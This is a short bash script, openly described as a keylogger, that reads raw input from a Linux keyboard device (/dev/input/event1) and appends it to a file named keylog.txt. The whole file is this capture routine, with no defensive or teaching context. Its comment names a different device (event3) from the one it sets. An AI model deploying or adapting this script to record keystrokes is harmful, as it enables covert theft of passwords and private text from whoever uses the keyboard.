#!/bin/bash

# Replace /dev/input/event3 with your keyboard device
DEVICE="/dev/input/event1"
LOGFILE="keylog.txt"

if [ ! -e "$DEVICE" ]; then
  echo "Keyboard device $DEVICE not found!"
  exit 1
fi

echo "Starting keylogging on $DEVICE, output will be saved to $LOGFILE"
cat "$DEVICE" >> "$LOGFILE"
